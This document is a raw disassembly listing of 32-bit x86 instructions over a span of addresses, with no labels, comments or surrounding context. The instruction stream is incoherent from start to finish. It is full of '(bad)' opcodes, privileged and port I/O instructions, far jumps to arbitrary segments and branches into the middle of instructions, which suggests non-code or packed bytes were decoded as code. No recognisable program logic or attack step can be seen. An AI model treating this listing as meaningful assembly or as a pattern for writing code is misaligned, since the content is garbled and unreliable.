  427b5c:	cmp    BYTE PTR [eax-0x21],dl
  427b5f:	int3   
  427b60:	fs call 0x4767fe
  427b66:	sahf   
  427b67:	jno    0x427b33
  427b69:	jmp    0xdf14:0xdc7cc800
  427b70:	mov    ebp,0x5fad5090
  427b75:	iret   
  427b76:	jae    0x427bc2
  427b78:	lds    ebx,FWORD PTR [eax+0x40f36201]
  427b7e:	adc    al,0xe7
  427b80:	xor    dl,al
  427b82:	pop    ecx
  427b83:	mov    eax,0x12557973
  427b88:	call   0x6646:0x109ca156
  427b8f:	arpl   WORD PTR ds:0xedb2efc0,ax
  427b95:	mov    bh,0xdf
  427b97:	or     cl,BYTE PTR [esi]
  427b99:	jo     0x427b9b
  427b9b:	bound  ebp,QWORD PTR [esi+0x5]
  427b9e:	je     0x427b9c
  427ba0:	add    eax,0xd992cbc0
  427ba5:	mov    edx,0x181eeeb2
  427baa:	mov    ah,0xe6
  427bac:	push   ss
  427bad:	or     BYTE PTR [edi+esi*4+0x4a],bl
  427bb1:	call   0x7cdc59b9
  427bb6:	icebp  
  427bb7:	adc    dl,BYTE PTR [esi-0x5b]
  427bba:	(bad)  
  427bbb:	adc    cl,BYTE PTR [edx]
  427bbd:	sar    DWORD PTR gs:[ebp-0x7a46a2f7],0x71
  427bc5:	out    0x71,eax
  427bc7:	(bad)  
  427bc8:	fldenv [ebx+0x43]
  427bcb:	push   cs
  427bcc:	into   
  427bcd:	cmp    dh,bl
  427bcf:	add    BYTE PTR [eax+0x32902556],cl
  427bd5:	repz icebp 
  427bd7:	js     0x427c00
  427bd9:	imul   ebx,DWORD PTR [eax],0xc0792779
  427bdf:	jne    0x427bb7
  427be1:	(bad)  
  427be3:	dec    edx
  427be4:	mov    al,0x3d
  427be6:	call   0x2a96ddee
  427beb:	mov    ah,0x3d
  427bed:	adc    BYTE PTR [eax+0x4a],ah
  427bf0:	dec    ecx
  427bf1:	or     BYTE PTR [edx],ch
  427bf3:	cmp    eax,0xac295405
  427bf8:	xchg   ebx,eax
  427bf9:	push   esp
  427bfa:	stc    
  427bfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427bfc:	jl     0x427b9d
  427bfe:	cld    
  427bff:	icebp  
  427c00:	in     al,0xc
  427c02:	(bad)  
  427c03:	sti    
  427c04:	(bad)  
  427c05:	fdiv   st(1),st
  427c07:	push   cs
  427c08:	mov    ds:0xa40bd301,eax
  427c0d:	jno    0x427b95
  427c0f:	add    BYTE PTR [edx-0x27],ah
  427c12:	xchg   edi,eax
  427c13:	add    al,0xfd
  427c15:	test   al,0x6e
  427c17:	je     0x427bef
  427c19:	fsub   st,st(7)
  427c1b:	add    ebx,edi
  427c1d:	mov    al,BYTE PTR [ecx]
  427c1f:	mov    bh,0x4d
  427c21:	pusha  
  427c22:	jne    0x427c29
  427c24:	out    0xae,al
  427c26:	shl    BYTE PTR [ebp+0x79805ec5],cl
  427c2c:	popa   
  427c2d:	fld    DWORD PTR [eax]
  427c2f:	jmp    0xd100:0x8ebeb023
  427c36:	mov    esi,0x48e670d2
  427c3b:	add    ecx,ebp
  427c3d:	popa   
  427c3e:	push   edx
  427c3f:	nop
  427c40:	pop    ebp
  427c41:	popa   
  427c42:	fld    DWORD PTR [eax]
  427c44:	add    ch,BYTE PTR [ebx-0x49]
  427c47:	rol    BYTE PTR [edi+0x24],0xdd
  427c4b:	add    BYTE PTR [eax],bh
  427c4d:	iret   
  427c4e:	or     al,0x53
  427c50:	bound  esi,QWORD PTR [ecx]
  427c52:	or     al,0x86
  427c54:	daa    
  427c55:	into   
  427c56:	imul   eax,DWORD PTR [ecx-0x27],0x5308eb79
  427c5d:	pop    edi
  427c5e:	add    eax,ebp
  427c60:	jecxz  0x427cc2
  427c62:	fld    DWORD PTR [eax]
  427c64:	bound  edi,QWORD PTR [edx-0x41c5db45]
  427c6a:	(bad)  
  427c6b:	neg    DWORD PTR [esi+0x1cc15dab]
  427c71:	(bad)  
  427c72:	(bad)  
  427c73:	inc    BYTE PTR [ecx+0x5d935ea6]
  427c79:	data16 fld DWORD PTR [eax]
  427c7c:	jb     0x427c98
  427c7e:	mov    ebx,0xe3746c1c
  427c83:	cmp    eax,0x18bb2262
  427c88:	jb     0x427c22
  427c8a:	dec    ecx
  427c8b:	add    ecx,ebp
  427c8d:	popa   
  427c8e:	push   esp
  427c8f:	cmp    eax,0x36916701
  427c94:	push   ds
  427c95:	xor    ecx,DWORD PTR [esi]
  427c97:	mov    WORD PTR [eax],es
  427c99:	add    BYTE PTR [edi],cl
  427c9b:	gs xor eax,edi
  427c9e:	lods   al,BYTE PTR ds:[esi]
  427c9f:	and    BYTE PTR [ecx+edx*2-0x38],cl
  427ca3:	add    bh,BYTE PTR [edx-0x7defcb07]
  427ca9:	mov    ds,WORD PTR [edi-0x23]
  427cac:	add    BYTE PTR [eax],al
  427cae:	rcr    BYTE PTR [ebx],0x7c
  427cb1:	adc    BYTE PTR [edx-0x44ff6ea8],bh
  427cb7:	fisub  DWORD PTR [ecx]
  427cb9:	enter  0xe332,0x94
  427cbd:	add    bl,cl
  427cbf:	(bad)  
  427cc1:	mov    dl,0x38
  427cc3:	cmp    edx,DWORD PTR [ebp+0xdabb00]
  427cc9:	mov    eax,ebp
  427ccb:	repnz add BYTE PTR [eax],al
  427cce:	mov    edx,ebp
  427cd0:	sti    
  427cd1:	jg     0x427c63
  427cd3:	out    0xeb,eax
  427cd5:	jne    0x427ced
  427cd7:	in     al,0xf9
  427cd9:	push   esp
  427cda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427cdb:	xchg   esi,eax
  427cdc:	push   ds
  427cdd:	sbb    al,0xf0
  427cdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427ce0:	cmc    
  427ce1:	adc    dh,bh
  427ce3:	sbb    DWORD PTR [ecx-0x72],edi
  427ce6:	add    BYTE PTR [esi],ah
  427ce8:	push   ds
  427ce9:	and    BYTE PTR [edx],ch
  427ceb:	ret    0x77e1
  427cee:	jno    0x427cc9
  427cf0:	out    0x6b,eax
  427cf2:	hlt    
  427cf3:	adc    dh,dh
  427cf5:	mov    esp,DWORD PTR [edi-0x47]
  427cf8:	sbb    BYTE PTR [ebp+0x501cb98f],cl
  427cfe:	add    BYTE PTR [eax+0x20cef9a7],dh
  427d04:	sbb    DWORD PTR [ecx-0x77],edx
  427d07:	inc    edi
  427d08:	mov    ecx,0xa0905118
  427d0d:	call   0xf653ff9f
  427d12:	mov    esp,DWORD PTR [edx-0x58]
  427d15:	jp     0x427cee
  427d17:	mov    ch,BYTE PTR [edi-0x596db584]
  427d1d:	mov    esi,0x7b776a0f
  427d22:	ss in  eax,dx
  427d24:	scas   al,BYTE PTR es:[edi]
  427d25:	dec    eax
  427d26:	sti    
  427d27:	outs   dx,BYTE PTR ds:[esi]
  427d28:	fsub   QWORD PTR [eax]
  427d2a:	xchg   DWORD PTR [edi+eax*8-0x392a076f],ebp
  427d31:	jns    0x427cf3
  427d33:	push   esi
  427d34:	push   esp
  427d35:	jle    0x427db3
  427d37:	jle    0x427dad
  427d39:	(bad)  
  427d3a:	jae    0x427d96
  427d3c:	cmc    
  427d3d:	sub    al,0x7a
  427d3f:	dec    esi
  427d40:	inc    ebx
  427d41:	dec    ecx
  427d42:	je     0x427cca
  427d44:	test   BYTE PTR [ecx+0x74],cl
  427d47:	jle    0x427d6d
  427d49:	push   esi
  427d4a:	sbb    ebx,DWORD PTR [ebx-0x5578bd82]
  427d50:	mov    edx,0x73447c35
  427d55:	inc    edi
  427d56:	aaa    
  427d57:	xchg   DWORD PTR [ebx],edx
  427d59:	push   0x24d42687
  427d5e:	jg     0x427d1c
  427d60:	test   DWORD PTR [eax+eax*1],0x7d706200
  427d67:	sub    BYTE PTR [ecx],dh
  427d69:	xor    BYTE PTR [edx+eax*4],cl
  427d6c:	out    dx,al
  427d6d:	jb     0x427d6d
  427d6f:	jmp    DWORD PTR [ebp-0x12]
  427d72:	inc    esp
  427d73:	pop    ebx
  427d74:	lods   al,BYTE PTR ds:[esi]
  427d75:	lods   eax,DWORD PTR ds:[esi]
  427d76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d77:	pop    eax
  427d78:	and    BYTE PTR [ebx-0x2],ah
  427d7b:	mov    WORD PTR [esi-0x69],fs
  427d7e:	jge    0x427d02
  427d80:	fidiv  DWORD PTR [edx-0x2]
  427d83:	(bad)  
  427d84:	fbstp  TBYTE PTR [esi-0xd]
  427d87:	es or  edi,edx
  427d8a:	jp     0x427d1c
  427d8c:	(bad)  
  427d8d:	(bad)  
  427d8f:	add    ebp,ebx
  427d91:	inc    ebx
  427d92:	je     0x427d98
  427d94:	(bad)  
  427d95:	fld    DWORD PTR [eax+0x29]
  427d98:	or     BYTE PTR [ebp+0x4b],ah
  427d9b:	jns    0x427e03
  427d9d:	mov    al,ds:0xd9da7e70
  427da2:	out    0x3,eax
  427da4:	sti    
  427da5:	xchg   esp,eax
  427da6:	xor    al,BYTE PTR [edi-0x17]
  427da9:	or     bl,BYTE PTR [ecx-0x44f4c94e]
  427daf:	jp     0x427d8c
  427db1:	push   eax
  427db2:	mov    ds:0xf819d3b3,eax
  427db7:	sti    
  427db8:	push   ecx
  427db9:	fdivr  QWORD PTR [ebp+0x2]
  427dbc:	retf   
  427dbd:	shl    ebp,0x3
  427dc0:	bound  edx,QWORD PTR [eax-0x64]
  427dc3:	pop    ds
  427dc4:	or     BYTE PTR [eax],0xf3
  427dc7:	iret   
  427dc8:	add    BYTE PTR [ecx-0x6a530047],al
  427dce:	fs jecxz 0x427d51
  427dd1:	mov    ds:0x1e7aece1,al
  427dd6:	mov    ebp,0xa8637d0b
  427ddb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427ddc:	pop    esp
  427ddd:	je     0x427db9
  427ddf:	out    0x3,eax
  427de1:	(bad)  [esp+edx*2]
  427de4:	add    esp,DWORD PTR [edx-0x27]
  427de7:	ins    BYTE PTR es:[edi],dx
  427de8:	dec    ebp
  427de9:	call   0xfac0dcee
  427dee:	fsub   st,st(7)
  427df0:	add    ecx,DWORD PTR [ebp+0x3cb7eb83]
  427df6:	fsubr  DWORD PTR [edx+0x73]
  427df9:	(bad)  
  427dfa:	(bad)  
  427dfc:	lods   eax,DWORD PTR ds:[esi]
  427dfd:	lods   eax,DWORD PTR ds:[esi]
  427dfe:	fs cld 
  427e00:	pop    ds
  427e01:	jle    0x427e67
  427e03:	aad    0xa7
  427e05:	push   ebx
  427e06:	sbb    DWORD PTR [ecx],eax
  427e08:	jmp    0xb9679bb5
  427e0d:	loopne 0x427dab
  427e0f:	or     eax,0x825c7170
  427e14:	jne    0x427e77
  427e16:	fld    DWORD PTR [eax]
  427e18:	adc    ch,BYTE PTR [esi+0x491a18ee]
  427e1e:	push   edx
  427e1f:	call   0x8500:0xd9615d
  427e26:	push   ebp
  427e27:	add    ecx,ebp
  427e29:	popa   
  427e2a:	out    dx,al
  427e2b:	test   eax,0x192100fa
  427e30:	call   0x11bdc86
  427e35:	call   0xe943c716
  427e3a:	popa   
  427e3b:	mov    esp,0x4d3c60c2
  427e40:	add    ecx,ebp
  427e42:	popa   
  427e43:	jl     0x427dd7
  427e45:	push   0x27
  427e47:	pusha  
  427e48:	je     0x427e2a
  427e4a:	sub    BYTE PTR ds:0xb8e0c525,bl
  427e50:	add    dl,dl
  427e52:	dec    eax
  427e53:	mov    ah,0xd5
  427e55:	and    BYTE PTR [edi],al
  427e57:	inc    ecx
  427e58:	add    ecx,ebp
  427e5a:	popa   
  427e5b:	out    dx,al
  427e5c:	sbb    eax,0xb96641
  427e61:	jmp    0x3176dd18
  427e66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427e67:	pop    ss
  427e68:	add    DWORD PTR [esi+0x29115f75],esi
  427e6e:	push   ax
  427e70:	add    BYTE PTR [ecx+0x6400d95e],0xa6
  427e77:	in     al,dx
  427e78:	add    DWORD PTR [ebx],eax
  427e7a:	bound  esi,QWORD PTR [eax+0x5d]
  427e7d:	call   0xc857e3
  427e82:	xchg   esp,eax
  427e83:	icebp  
  427e84:	add    BYTE PTR [eax],al
  427e86:	cmp    esp,esp
  427e88:	retf   0x97e
  427e8b:	loop   0x427f0a
  427e8d:	mov    al,ds:0x8b00d70b
  427e92:	add    ah,ch
  427e94:	cmc    
  427e95:	add    BYTE PTR [eax],al
  427e97:	sti    
  427e98:	fld1   
  427e9a:	sub    ecx,DWORD PTR [ebx+0x0]
  427e9d:	aaa    
  427e9e:	mov    ebx,edi
  427ea0:	ret    0x6828
  427ea3:	or     esi,DWORD PTR [edi-0x29900000]
  427ea9:	cmc    
  427eaa:	mov    bh,0x93
  427eac:	fld    QWORD PTR [eax]
  427eae:	add    BYTE PTR [ebp+ebp*1-0x1d647502],cl
  427eb5:	retf   0x530f
  427eb8:	mov    ebp,0xe1bbffff
  427ebd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427ebe:	cwde   
  427ebf:	retf   
  427ec0:	(bad)  
  427ec1:	add    BYTE PTR [ebx],dh
  427ec3:	jb     0x427ea7
  427ec5:	retf   0x160f
  427ec8:	push   ss
  427ec9:	mov    BYTE PTR [edi+0xdd1b],bl
  427ecf:	add    dh,ah
  427ed1:	pushf  
  427ed2:	add    BYTE PTR [ebx-0x376b82a],cl
  427ed8:	icebp  
  427ed9:	add    BYTE PTR [eax],al
  427edb:	jnp    0x427ec8
  427edd:	inc    esp
  427ede:	and    al,0x78
  427ee0:	es dec esp
  427ee2:	push   ebp
  427ee3:	lock lods al,BYTE PTR ds:[esi]
  427ee5:	call   0xf66033a7
  427eea:	mov    ebp,DWORD PTR [ebx+0x372474df]
  427ef0:	jecxz  0x427ee0
  427ef2:	js     0x427eb8
  427ef4:	loope  0x427f3b
  427ef6:	push   eax
  427ef7:	add    ch,dh
  427ef9:	xchg   esi,eax
  427efa:	or     cl,BYTE PTR [eax]
  427efc:	bound  edi,QWORD PTR [ebx+0x7b]
  427eff:	mov    edx,0x145533c
  427f04:	in     eax,dx
  427f05:	paddd  mm7,mm7
  427f08:	(bad)  
  427f09:	out    0x74,eax
  427f0b:	mov    al,ds:0x36fe7062
  427f10:	in     eax,dx
  427f11:	adc    edi,esi
  427f13:	jmp    DWORD PTR [edx+0x7c]
  427f16:	repnz mov ch,ch
  427f19:	jecxz  0x427f18
  427f1b:	jmp    DWORD PTR [edx-0x7]
  427f1e:	mov    al,fs:0xfafe7062
  427f24:	outs   dx,BYTE PTR ds:[esi]
  427f25:	aam    0x24
  427f27:	xchg   DWORD PTR ds:0x4223c9a3,ebx
  427f2d:	sbb    BYTE PTR [ebx-0xe],al
  427f30:	fnsave [edx-0x57203788]
  427f36:	(bad)  
  427f37:	jp     0x427f1a
  427f39:	add    ch,BYTE PTR [edx+0x0]
  427f3c:	bound  esi,QWORD PTR [eax+0x45]
  427f3f:	je     0x427f8a
  427f41:	mov    BYTE PTR [edx+0x7a6b5123],ah
  427f47:	cmp    DWORD PTR [ebp-0x537ac19e],ebp
  427f4d:	jp     0x427fc3
  427f4f:	xor    DWORD PTR [ebp+0x1e873e72],ebx
  427f55:	aam    0xe4
  427f57:	ss fcomp QWORD PTR es:[eax]
  427f5b:	or     eax,DWORD PTR [eax]
  427f5d:	push   ss
  427f5e:	adc    bh,0x54
  427f61:	jge    0x427f6e
  427f63:	jmp    0xdac6f48b
  427f68:	adc    DWORD PTR [edx],esp
  427f6a:	jo     0x427f57
  427f6c:	stos   BYTE PTR es:[edi],al
  427f6d:	retf   0xfe6f
  427f70:	(bad)  
  427f71:	jmp    0x8962682c
  427f76:	fldcw  WORD PTR [ecx-0x17ba1e73]
  427f7c:	add    esp,DWORD PTR [edx+0x54]
  427f7f:	sub    al,0xe8
  427f81:	(bad)  
  427f82:	fdivr  QWORD PTR [ecx-0x73]
  427f85:	or     DWORD PTR [edx-0x18],ecx
  427f88:	add    esp,DWORD PTR [edx+0x5c]
  427f8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427f8c:	adc    bl,bl
  427f8e:	test   eax,0xd9eea2b0
  427f93:	out    0x3,eax
  427f95:	(bad)  
  427f96:	int3   
  427f97:	and    BYTE PTR [ebx+0x3e7d9f6],ah
  427f9d:	(bad)  
  427f9e:	aam    0x10
  427fa0:	mov    ds:0x3e7d9de,eax
  427fa5:	outs   dx,DWORD PTR ds:[esi]
  427fa6:	fdivr  st(6),st
  427fa8:	pop    esi
  427fa9:	sub    eax,0x2f2f2754
  427fae:	push   esp
  427faf:	lods   al,BYTE PTR ds:[esi]
  427fb0:	out    0x81,eax
  427fb2:	push   edx
  427fb3:	shr    BYTE PTR [esp+ecx*2],1
  427fb6:	pop    edi
  427fb7:	and    eax,DWORD PTR [ebx-0x76]
  427fba:	std    
  427fbb:	ret    
  427fbc:	push   ss
  427fbd:	dec    esi
  427fbe:	(bad)  
  427fbf:	ins    BYTE PTR es:[edi],dx
  427fc0:	cmp    al,BYTE PTR [eax]
  427fc2:	cmp    bl,cl
  427fc4:	mov    esi,0xe7d9da72
  427fc9:	add    ebx,ebx
  427fcb:	sub    BYTE PTR [esp+eax*1+0x62],dl
  427fcf:	fldenv [eax+0x73]
  427fd2:	repnz (bad) 
  427fd5:	add    ebx,ebp
  427fd7:	adc    eax,0xd1dae80c
  427fdc:	rol    BYTE PTR ds:0xadd36088,1
  427fe2:	jg     0x427fec
  427fe4:	sub    esp,edx
  427fe6:	push   ss
  427fe7:	add    al,0x21
  427fe9:	(bad)  [edi+0x68d9e7c9]
  427fef:	in     eax,0x0
  427ff1:	or     eax,0xc1f0586e
  427ff6:	mov    bh,0x0
  427ff8:	add    ecx,ebp
  427ffa:	stc    
  427ffb:	pop    edi
  427ffc:	add    ecx,ebp
  427ffe:	popa   
  427fff:	dec    esi
  428000:	dec    ebx
  428001:	or     DWORD PTR [ecx+0x214bb8db],ebp
  428007:	pusha  
  428008:	loop   0x427fe3
  42800a:	inc    ebp
  42800b:	fld    DWORD PTR [eax]
  42800d:	adc    DWORD PTR [esi-0x37],ebx
  428010:	add    cl,ch
  428012:	repnz adc dh,BYTE PTR [ecx-0x7f]
  428016:	pop    esp
  428017:	mov    ch,0xff
  428019:	call   0xed6794fa
  42801e:	loope  0x42805a
  428020:	test   ecx,ebp
  428022:	popa   
  428023:	fsqrt  
  428025:	sbb    al,BYTE PTR [eax]
  428027:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428028:	push   edx
  428029:	inc    ebx
  42802a:	cdq    
  42802b:	fcomp  QWORD PTR [edx]
  42802d:	or     DWORD PTR [eax+0x13],esi
  428030:	or     al,0x88
  428032:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428033:	mov    ecx,0xe68d4b50
  428038:	push   edx
  428039:	sub    ecx,0x6f87d961
  42803f:	(bad)  
  428041:	add    cl,ch
  428043:	sub    BYTE PTR [ebx-0x73],bl
  428046:	jmp    0xe94259ac
  42804b:	popa   
  42804c:	fld    DWORD PTR [edi+0xd8d16f]
  428052:	jmp    0xe9d7d345
  428057:	popa   
  428058:	fldenv ds:0x48d2caa8
  42805e:	push   esp
  42805f:	ins    BYTE PTR es:[edi],dx
  428060:	push   edx
  428061:	mov    esi,DWORD PTR [ebp+0x66]
  428064:	fld    DWORD PTR [eax]
  428066:	pusha  
  428067:	sar    BYTE PTR [eax],1
  428069:	add    DWORD PTR [eax],eax
  42806b:	jnp    0x428048
  42806d:	xchg   DWORD PTR [esi+0xd503],ecx
  428073:	ret    0xa54b
  428076:	add    BYTE PTR [ebx-0x25],cl
  428079:	add    esi,0x917a5
  42807f:	lea    ecx,[eax+esi*8-0x18]
  428083:	aas    
  428084:	fild   DWORD PTR [eax]
  428086:	add    ch,cl
  428088:	xchg   ecx,eax
  428089:	push   ds
  42808a:	or     BYTE PTR [eax],al
  42808c:	cmp    ah,BYTE PTR [edi]
  42808e:	dec    DWORD PTR [edx-0x6070520b]
  428094:	or     ebx,ebx
  428096:	add    esi,0x51765
  42809c:	int    0x4d
  42809e:	lock mov esi,DWORD PTR [ebp-0x2cf9407a]
  4280a5:	test   DWORD PTR [eax+0x0],0x971fa3
  4280ac:	sti    
  4280ad:	push   ebp
  4280ae:	ja     0x4280b8
  4280b0:	cli    
  4280b1:	daa    
  4280b2:	add    ecx,DWORD PTR [ebx+0x13d45]
  4280b8:	retf   
  4280b9:	mov    dl,0x67
  4280bb:	lahf   
  4280bc:	mov    ebx,0xeb4e81da
  4280c1:	mov    dl,0x5f
  4280c3:	lahf   
  4280c4:	retf   
  4280c5:	fiadd  DWORD PTR [ecx+0x57b2eb4e]
  4280cb:	lahf   
  4280cc:	mov    ebx,0xb306bdda
  4280d1:	test   BYTE PTR [eax+0x0],0xf5
  4280d5:	adc    eax,0xaa005654
  4280da:	out    dx,al
  4280db:	xchg   bh,bh
  4280dd:	fld    DWORD PTR [eax]
  4280df:	add    BYTE PTR [edx+0x26],bh
  4280e2:	add    eax,0xa8ae628b
  4280e7:	out    0x60,al
  4280e9:	ret    
  4280ea:	inc    esp
  4280eb:	jg     0x428099
  4280ed:	call   0x624380ef
  4280f2:	jb     0x4280a7
  4280f4:	add    al,0xe9
  4280f6:	mov    ch,0xb8
  4280f8:	out    0x60,al
  4280fa:	arpl   WORD PTR [edi-0x73],ax
  4280fd:	jle    0x428170
  4280ff:	sub    ebp,0xffffffcf
  428102:	ins    DWORD PTR es:[edi],dx
  428103:	rcl    DWORD PTR [ecx+ebp*8+0x35],cl
  428107:	es je  0x42816c
  42810a:	jo     0x42810a
  42810c:	scas   eax,DWORD PTR es:[edi]
  42810d:	arpl   WORD PTR [ebx-0x55],cx
  428110:	push   edx
  428111:	fldcw  WORD PTR [esi+eiz*1]
  428114:	idiv   ah
  428116:	outs   dx,DWORD PTR ds:[esi]
  428117:	inc    BYTE PTR [esi+0x7540f51a]
  42811d:	retw   0xe744
  428121:	test   al,0x6
  428123:	mov    BYTE PTR [edx+eiz*2+0x6e00fe70],al
  42812a:	test   WORD PTR [edx-0x7a],di
  42812e:	jo     0x4280e8
  428130:	pmulhw mm4,QWORD PTR ds:0x9054faa2
  428137:	fsqrt  
  428139:	outs   dx,DWORD PTR ds:[esi]
  42813a:	dec    esp
  42813b:	sbb    BYTE PTR [eax+0x62],al
  42813e:	repz inc ecx
  428140:	or     al,0xe1
  428142:	std    
  428143:	test   DWORD PTR [eax],eax
  428145:	bound  esi,QWORD PTR [eax+0x4]
  428148:	jne    0x4281a3
  42814a:	repz mov edi,0x12de6273
  428150:	sti    
  428151:	sub    al,0xe4
  428153:	mov    WORD PTR [edx+0x0],es
  428156:	push   es
  428157:	addr16 mov ecx,0xcdb7616f
  42815d:	cli    
  42815e:	ja     0x428139
  428160:	inc    ebx
  428161:	push   ss
  428162:	and    bl,cl
  428164:	dec    ax
  428166:	outs   dx,BYTE PTR ds:[esi]
  428167:	add    al,0x3b
  428169:	mov    ebp,DWORD PTR [eax+0x6203f670]
  42816f:	fldenv [esi-0x5a]
  428172:	add    ecx,ebx
  428174:	ins    BYTE PTR es:[edi],dx
  428175:	into   
  428176:	int    0x71
  428178:	jge    0x42815d
  42817a:	(bad)  
  42817b:	fnstenv [edi+0x5]
  42817e:	test   eax,0xb04344fb
  428183:	push   eax
  428184:	cdq    
  428185:	mov    ebp,DWORD PTR [eax-0x27617ffb]
  42818b:	(bad)  
  42818d:	mov    ah,BYTE PTR [esi-0x3f7d104b]
  428193:	std    
  428194:	out    0x8c,eax
  428196:	mov    al,ds:0x41c85f05
  42819b:	int    0x60
  42819d:	(bad)  
  42819e:	mov    ch,0xfb
  4281a0:	and    eax,0xb950620c
  4281a5:	fild   DWORD PTR [edx+ecx*1-0x4c]
  4281a9:	mov    eax,0x2b27a861
  4281ae:	dec    esi
  4281af:	add    ebp,DWORD PTR [edi-0x48]
  4281b2:	inc    ecx
  4281b3:	shl    DWORD PTR [esi+esi*1+0x56],1
  4281b7:	rcr    DWORD PTR [esi-0x3b],1
  4281ba:	add    BYTE PTR [ecx],dh
  4281bc:	fsubr  DWORD PTR [eax+0x5fd3dadf]
  4281c2:	add    al,0x82
  4281c4:	(bad)  
  4281c6:	cli    
  4281c7:	lods   eax,DWORD PTR ds:[esi]
  4281c8:	int3   
  4281c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4281ca:	inc    ecx
  4281cb:	sbb    BYTE PTR [edi+0x15e503e4],dl
  4281d1:	int3   
  4281d2:	pop    es
  4281d3:	arpl   WORD PTR [edx],bx
  4281d5:	pushf  
  4281d6:	mov    ah,BYTE PTR [ebx]
  4281d8:	std    
  4281d9:	add    BYTE PTR [edx-0x1f90fb62],dh
  4281df:	mov    ebx,0x39e9685c
  4281e4:	cmp    eax,0x1b3cdefa
  4281e9:	add    eax,0xed539ae9
  4281ee:	cmp    cl,ah
  4281f0:	loop   0x4281fa
  4281f2:	jmp    0x7253681b
  4281f7:	sub    dl,al
  4281f9:	push   eax
  4281fa:	mov    dh,0x51
  4281fc:	pop    edi
  4281fd:	je     0x4281e0
  4281ff:	or     dl,bh
  428201:	call   0xfaa30a0f
  428206:	xchg   edx,eax
  428207:	push   0x71
  428209:	mov    cl,0x92
  42820b:	je     0x42826d
  42820d:	pop    eax
  42820e:	sub    al,0xa0
  428210:	int    0x0
  428212:	pop    ds
  428213:	fldcw  WORD PTR [ecx+0x7e]
  428216:	pop    es
  428217:	retf   0x8d5b
  42821a:	daa    
  42821b:	into   
  42821c:	jae    0x42822d
  42821e:	retf   0x6600
  428221:	fld    DWORD PTR [esi+0xd8dd6f]
  428227:	jmp    0xe1679a1f
  42822c:	loopne 0x428264
  42822e:	sub    ecx,0x4600d961
  428234:	fbstp  TBYTE PTR [ecx+eax*1]
  428237:	jmp    0xf942379d
  42823c:	fist   WORD PTR [ecx+eax*1-0x17]
  428240:	popa   
  428241:	push   esp
  428242:	inc    ebp
  428243:	int    0x55
  428245:	cwde   
  428246:	sub    DWORD PTR [ebp+0x61],0xffffffd9
  42824a:	add    al,ch
  42824c:	popa   
  42824d:	fld    DWORD PTR [eax]
  42824f:	pusha  
  428250:	out    0x50,eax
  428252:	add    DWORD PTR [eax],eax
  428254:	mov    ebx,0x93c256d7
  428259:	xlat   BYTE PTR ds:[ebx]
  42825a:	jns    0x428248
  42825c:	mov    bl,0x86
  42825e:	push   ebp
  42825f:	push   esi
  428260:	hlt    
  428261:	dec    esi
  428262:	jge    0x428288
  428264:	imul   edx,DWORD PTR [edx-0x15],0xffffff83
  428268:	sbb    al,0xd1
  42826a:	add    BYTE PTR [ebx-0x5000dc5e],cl
  428270:	jp     0x428220
  428272:	mov    ebp,0x83d77b01
  428277:	in     eax,dx
  428278:	dec    esp
  428279:	push   ebx
  42827a:	mov    ds:0x83d74b01,al
  42827f:	imul   BYTE PTR [ebx+edx*2]
  428282:	call   0xfe79:0xd73b0001
  428289:	xor    esp,DWORD PTR [esi+ebx*1]
  42828c:	push   0x3c
  42828e:	dec    esp
  42828f:	push   ebp
  428290:	and    al,0x1b
  428292:	and    dl,0xb8
  428295:	sbb    al,0x9d
  428297:	cmc    
  428298:	lea    eax,[edi+0x71]
  42829b:	push   ss
  42829c:	push   esi
  42829d:	jbe    0x428224
  42829f:	not    DWORD PTR ds:0x40c35b
  4282a5:	js     0x4282b8
  4282a7:	or     eax,0x84cc4b85
  4282ac:	jp     0x4282b8
  4282ae:	xlat   BYTE PTR ds:[ebx]
  4282af:	add    BYTE PTR [ebx],dh
  4282b1:	xor    BYTE PTR [edi],ch
  4282b3:	dec    BYTE PTR [eax-0x76e58d41]
  4282b9:	push   DWORD PTR [edx+0x1e]
  4282bc:	pop    eax
  4282bd:	dec    eax
  4282be:	fwait
  4282bf:	std    
  4282c0:	je     0x428325
  4282c2:	das    
  4282c3:	or     cl,BYTE PTR [ebp+0x59127307]
  4282c9:	push   ebx
  4282ca:	push   edi
  4282cb:	ss (bad) 
  4282cd:	(bad)  
  4282cf:	mov    DWORD PTR [esi+eax*4+0x64],eax
  4282d3:	aam    0x54
  4282d5:	adc    dl,bl
  4282d7:	adc    DWORD PTR [eax+0x74],esp
  4282da:	xor    dh,bh
  4282dc:	jle    0x42827c
  4282de:	je     0x428263
  4282e0:	rcr    BYTE PTR [ebp-0xb],0xf3
  4282e4:	add    BYTE PTR [edx+0x70],ah
  4282e7:	mov    DWORD PTR [edi-0x8597700],edi
  4282ed:	out    dx,eax
  4282ee:	out    dx,eax
  4282ef:	pop    ecx
  4282f0:	test   al,0x10
  4282f2:	fbld   TBYTE PTR [eax+ebp*8-0x2b77f4e9]
  4282f9:	cmp    bl,BYTE PTR [ebx+ebx*1-0x58]
  4282fd:	add    edi,DWORD PTR [edx-0x79bb7640]
  428303:	mov    BYTE PTR [ecx],ch
  428305:	push   ss
  428306:	loope  0x428339
  428308:	add    al,0xb
  42830a:	out    0x5f,eax
  42830c:	(bad)  
  42830d:	jmp    DWORD PTR [edx-0x2a]
  428310:	push   cs
  428311:	lea    edx,[esi+0x3a591694]
  428317:	sbb    edi,ebp
  428319:	stc    
  42831a:	sbb    eax,0x6e23c1ed
  42831f:	mov    edx,0x850d4fd1
  428324:	sahf   
  428325:	adc    DWORD PTR [edx+0x6ec48170],esp
  42832b:	cmc    
  42832c:	cmp    eax,0xfe13df0b
  428331:	jmp    DWORD PTR [edx-0x6a]
  428334:	add    BYTE PTR [eax-0x6e],bl
  428337:	in     eax,0xc9
  428339:	and    eax,DWORD PTR [edx-0x6ddc1f28]
  42833f:	sbb    al,0x7
  428341:	data16 arpl WORD PTR [eax],bx
  428344:	popf   
  428345:	xchg   ebp,eax
  428346:	(bad)
  428349:	sub    BYTE PTR [edi+0x71],ah
